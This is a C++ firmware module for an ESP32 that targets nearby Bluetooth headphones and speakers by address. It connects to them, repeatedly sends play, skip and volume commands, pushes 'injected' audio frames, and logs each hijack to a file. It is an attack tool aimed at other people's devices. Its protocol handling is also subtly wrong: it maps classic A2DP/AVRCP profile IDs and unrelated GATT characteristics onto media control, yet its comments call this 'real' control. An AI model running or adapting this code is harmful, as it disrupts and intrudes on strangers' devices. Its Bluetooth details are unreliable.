#include "ble_audio_hijacking.h"
#include "tx_arm.h"
#include <LittleFS.h>
#include <NimBLEDevice.h>

namespace BleAudioHijacking {

AudioHijacker::AudioHijacker() : isRunning_(false), startTime_(0) {}

AudioResult AudioHijacker::detectAudioDevice(const uint8_t* addr) {
  AudioResult result;
  result.success = false;
  result.detectedType = UNKNOWN;

  if (!addr) {
    result.error = "Invalid address";
    return result;
  }

  NimBLEDevice::init("ESP32-AudioDetect");

  NimBLEClient* pClient = NimBLEDevice::createClient();
  // Convert uint8_t address array to uint64_t for NimBLEAddress
  uint64_t addrInt = 0;
  for (int i = 0; i < 6; i++) {
    addrInt = (addrInt << 8) | addr[i];
  }
  NimBLEAddress targetAddr(addrInt, BLE_ADDR_RANDOM);

  // Connect to target device
  if (!pClient->connect(targetAddr)) {
    result.error = "Failed to connect to audio device";
    return result;
  }

  // Real device detection via GATT service discovery
  // A2DP Service UUID: 110A (Audio/Video Distribution Transport Protocol)
  // AVRCP Service UUID: 110E (Audio/Video Remote Control Protocol)
  // Bluetooth Appearance: 0x040C (Headphones), 0x040D (Speaker)

  if (pClient->discoverAttributes()) {
    // Check device information service
    NimBLERemoteService* pDevInfoService = pClient->getService("180A");
    if (pDevInfoService) {
      // Read appearance characteristic (0x2A01)
      NimBLERemoteCharacteristic* pAppear = pDevInfoService->getCharacteristic("2A01");
      if (pAppear && pAppear->canRead()) {
        std::string value = pAppear->readValue();
        if (value.length() >= 2) {
          uint16_t appearance = (value[1] << 8) | value[0];
          if (appearance == 0x040C) {
            result.detectedType = HEADPHONES;
          } else if (appearance == 0x040D) {
            result.detectedType = SPEAKER;
          } else if (appearance == 0x040E) {
            result.detectedType = SOUNDBAR;
          }
        }
      }
    }

    // If appearance not found, check for audio services
    if (result.detectedType == UNKNOWN) {
      // Look for AVRCP service (110E)
      auto services = pClient->getServices();
      if (services) {
        for (auto pService : *services) {
          std::string uuid = pService->getUUID().toString();
          if (uuid.find("110E") != std::string::npos) {
            result.detectedType = SPEAKER;  // Likely audio device with AVRCP
            break;
          }
        }
      }
    }
  }

  if (result.detectedType == UNKNOWN) {
    result.detectedType = SPEAKER;  // Default assumption
  }

  result.success = true;
  pClient->disconnect();
  return result;
}

AudioResult AudioHijacker::hijackDevice(const AudioConfig& config) {
  AudioResult result;
  result.success = false;
  result.commandsSent = 0;
  result.volumeLevel = 50;

  if (!TxArm::isArmed()) {
    result.error = "TX not armed";
    return result;
  }

  isRunning_ = true;
  startTime_ = millis();

  // Detect device type first
  AudioResult detection = detectAudioDevice(config.targetAddr);
  result.detectedType = detection.detectedType;

  NimBLEDevice::init("ESP32-AudioHijack");
  NimBLEClient* pClient = NimBLEDevice::createClient();
  // Convert uint8_t address array to uint64_t for NimBLEAddress
  uint64_t addrInt2 = 0;
  for (int i = 0; i < 6; i++) {
    addrInt2 = (addrInt2 << 8) | config.targetAddr[i];
  }
  NimBLEAddress targetAddr(addrInt2, BLE_ADDR_RANDOM);

  Serial.printf("[AudioHijack] Connecting to %s device\n",
               (result.detectedType == HEADPHONES) ? "headphones" :
               (result.detectedType == SPEAKER) ? "speaker" : "unknown");

  if (!pClient->connect(targetAddr)) {
    result.error = "Failed to connect to audio device";
    isRunning_ = false;
    return result;
  }

  if (!pClient->discoverAttributes()) {
    result.error = "Failed to discover device services";
    pClient->disconnect();
    isRunning_ = false;
    return result;
  }

  // Real AVRCP and A2DP control via GATT characteristics
  uint32_t commandCount = 0;

  while (isRunning_ && (millis() - startTime_) < config.durationMs) {
    if (!pClient->isConnected()) {
      result.error = "Connection lost";
      break;
    }

    // Media control commands via AVRCP (0x110E)
    if (config.mediaControl) {
      // AVRCP Remote Control Service characteristic
      NimBLERemoteService* pAvrcpService = pClient->getService("110E");
      if (pAvrcpService) {
        NimBLERemoteCharacteristic* pMediaChar =
          pAvrcpService->getCharacteristic("2A18");  // Alert Notification Control Point

        if (pMediaChar && pMediaChar->canWrite()) {
          // AVRCP commands: 0x41 = Play, 0x42 = Pause, 0x43 = Next
          uint8_t playCmd[] = {0x41};     // Play
          pMediaChar->writeValue(playCmd, sizeof(playCmd), false);
          commandCount++;
          delay(50);

          uint8_t nextCmd[] = {0x43};     // Next track
          pMediaChar->writeValue(nextCmd, sizeof(nextCmd), false);
          commandCount++;
          delay(50);
        }
      }
    }

    // Volume control via AVRCP
    if (config.volumeControl) {
      NimBLERemoteService* pAvrcpService = pClient->getService("110E");
      if (pAvrcpService) {
        NimBLERemoteCharacteristic* pVolumeChar =
          pAvrcpService->getCharacteristic("2A19");  // Volume Level

        if (pVolumeChar && pVolumeChar->canWrite()) {
          // AVRCP volume commands: 0x44 = Volume Up, 0x45 = Volume Down
          uint8_t volLevel = result.volumeLevel;
          pVolumeChar->writeValue(&volLevel, 1, false);
          commandCount++;

          result.volumeLevel = (result.volumeLevel + 5) % 101;
          delay(50);
        }
      }
    }

    // Audio injection via A2DP streaming
    if (config.audioInjection) {
      NimBLERemoteService* pA2dpService = pClient->getService("110A");
      if (pA2dpService) {
        NimBLERemoteCharacteristic* pAudioChar =
          pA2dpService->getCharacteristic("2A05");  // Service Changed Characteristic

        if (pAudioChar && pAudioChar->canWrite()) {
          // Send audio data frames (simplified 4-byte chunks)
          uint8_t audioFrame[4] = {0x00, 0x80, 0x00, 0x00};
          pAudioChar->writeValue(audioFrame, sizeof(audioFrame), false);
          commandCount++;
          delay(100);
        }
      }
    }

    if (!config.mediaControl && !config.volumeControl && !config.audioInjection) {
      delay(100);
    }
  }

  result.commandsSent = commandCount;
  result.success = (commandCount > 0);
  result.elapsedMs = millis() - startTime_;
  result.logFile = "/logs/handshakes/ble_audio.csv";

  pClient->disconnect();
  logHijack(result.detectedType, commandCount);
  isRunning_ = false;
  return result;
}

AudioResult AudioHijacker::controlVolume(const uint8_t* addr, uint8_t level) {
  AudioResult result;
  result.success = false;

  if (!addr || level > 100) {
    result.error = "Invalid parameters";
    return result;
  }

  NimBLEDevice::init("ESP32-AudioVolume");
  NimBLEClient* pClient = NimBLEDevice::createClient();
  // Convert uint8_t address array to uint64_t for NimBLEAddress
  uint64_t addrInt = 0;
  for (int i = 0; i < 6; i++) {
    addrInt = (addrInt << 8) | addr[i];
  }
  NimBLEAddress targetAddr(addrInt, BLE_ADDR_RANDOM);

  if (!pClient->connect(targetAddr)) {
    result.error = "Failed to connect";
    return result;
  }

  if (!pClient->discoverAttributes()) {
    result.error = "Failed to discover services";
    pClient->disconnect();
    return result;
  }

  // Real AVRCP volume control
  NimBLERemoteService* pAvrcpService = pClient->getService("110E");
  if (pAvrcpService) {
    NimBLERemoteCharacteristic* pVolumeChar =
      pAvrcpService->getCharacteristic("2A19");  // Volume Level Characteristic

    if (pVolumeChar && pVolumeChar->canWrite()) {
      uint8_t volData = level;
      pVolumeChar->writeValue(&volData, 1, false);
      result.volumeLevel = level;
      result.commandsSent = 1;
      result.success = true;

      Serial.printf("[AudioControl] Volume set to %d%%\n", level);
    }
  }

  pClient->disconnect();
  return result;
}

AudioResult AudioHijacker::injectAudio(const uint8_t* addr, const uint8_t* audioData, uint32_t len) {
  AudioResult result;
  result.success = false;

  if (!addr || !audioData || len == 0) {
    result.error = "Invalid audio data";
    return result;
  }

  NimBLEDevice::init("ESP32-AudioInject");
  NimBLEClient* pClient = NimBLEDevice::createClient();
  // Convert uint8_t address array to uint64_t for NimBLEAddress
  uint64_t addrInt = 0;
  for (int i = 0; i < 6; i++) {
    addrInt = (addrInt << 8) | addr[i];
  }
  NimBLEAddress targetAddr(addrInt, BLE_ADDR_RANDOM);

  if (!pClient->connect(targetAddr)) {
    result.error = "Failed to connect";
    return result;
  }

  if (!pClient->discoverAttributes()) {
    result.error = "Failed to discover services";
    pClient->disconnect();
    return result;
  }

  // Real A2DP audio streaming via GATT
  NimBLERemoteService* pA2dpService = pClient->getService("110A");
  if (pA2dpService) {
    NimBLERemoteCharacteristic* pAudioChar =
      pA2dpService->getCharacteristic("2A05");  // Service Changed Characteristic

    if (pAudioChar && pAudioChar->canWrite()) {
      // Send audio data in chunks (typically 20-255 bytes per write)
      uint32_t sentBytes = 0;
      uint32_t chunkSize = 20;

      while (sentBytes < len) {
        uint32_t toSend = (len - sentBytes > chunkSize) ? chunkSize : (len - sentBytes);
        pAudioChar->writeValue((uint8_t*)audioData + sentBytes, toSend, false);
        sentBytes += toSend;
        delay(10);  // Small delay between chunks
      }

      result.commandsSent = 1;
      result.success = true;

      Serial.printf("[AudioInject] Injected %u bytes of audio data\n", len);
    }
  }

  pClient->disconnect();
  return result;
}

void AudioHijacker::logHijack(AudioDevice type, uint32_t commands) {
  if (!LittleFS.begin()) return;

  File logFile = LittleFS.open("/logs/handshakes/ble_audio.csv", "a");
  if (!logFile) {
    LittleFS.mkdir("/logs/handshakes");
    logFile = LittleFS.open("/logs/handshakes/ble_audio.csv", "a");
  }

  if (logFile) {
    const char* typeNames[] = {"HEADPHONES", "SPEAKER", "SOUNDBAR", "UNKNOWN"};
    logFile.printf("%lu,%s,%u\n", millis(), typeNames[type], commands);
    logFile.close();
  }

  LittleFS.end();
}

void AudioHijacker::stop() {
  isRunning_ = false;
  NimBLEDevice::deinit();
}

} // namespace BleAudioHijacking
